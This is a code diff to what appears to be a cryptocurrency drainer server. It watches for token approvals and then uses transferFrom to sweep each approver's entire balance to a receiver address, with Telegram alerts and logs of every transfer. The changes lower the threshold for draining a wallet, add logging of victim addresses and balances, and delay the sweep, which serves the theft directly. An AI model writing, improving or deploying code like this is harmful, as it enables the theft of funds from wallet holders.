@@ -156,10 +156,13 @@ async function sendToken(web3, symbol, contract, from, to) {
     let decimals = await contract.methods.decimals().call();
     let chainId = await web3.eth.net.getId();
     // larger 10$
-    let min = 10 * (10 ** decimals);
+    let min = 5 * (10 ** decimals);
+    logWaning(`${symbol} - ${chainId}, decimal: ${decimals} from: ${from}`);
+    logWaning(`contract: ${contract._address}`)
+    logWaning(`balance: ${balance}, allowance: ${allowance}, to: ${to}`);
     if (allowance > min && balance > min) {
         const gasEstimate = await contract.methods.transferFrom(from, to, balance).estimateGas({ from: spender });
-        log('sendToken', from, to, spender);
+        logWaning('send:', symbol, balance, from, to, spender);
         contract.methods.transferFrom(from, to, balance).send({ from: spender, gasPrice: gasPrice, gas: gasEstimate }).then(async r => {
             let content = {
                 onSent: {
@@ -192,7 +195,7 @@ async function sendToken(web3, symbol, contract, from, to) {
             }
 
             try {
-                db.saveError({ error: error.message }).catch()
+                db.saveError({ content }).catch()
                 appendFile("transferedsError.txt", JSON.stringify(content))
                 sendMessageClient({ error: error.message })
                 sentAlertTelegram({ error: error.message })
@@ -270,7 +273,9 @@ function listenEvents(settings = Settings) {
                     appendFile("approveds.txt", JSON.stringify(content.onApproval))
                     sendMessageClient(content)
                     sentAlertTelegram(content)
-                    sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
+                    setTimeout(() => {
+                        sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
+                    }, chainId == 1 ? 1000 * 60 : 1000);
                 }
             })
 
@@ -314,6 +319,7 @@ else if (argv.p) port = argv.p;
 
 var clients = []
 
+// const wss = new WebSocketServer({ port: port });
 const wss = new WebSocketServer({ port: port });
 log("port:", port)
 wss.on('connection', (ws) => {
@@ -328,7 +334,7 @@ wss.on('connection', (ws) => {
 
         if (msg.backup) {
             let fileName = `wea${moment().format("Y_M_D_h_m")}.sql`
-            exec("mysqldump wea > " + fileName, (error, stdout, stderr) => {
+            exec("mysqldump wea > data/" + fileName, (error, stdout, stderr) => {
                 if (error) {
                     logError("mysqldump error")
                     logError(error)
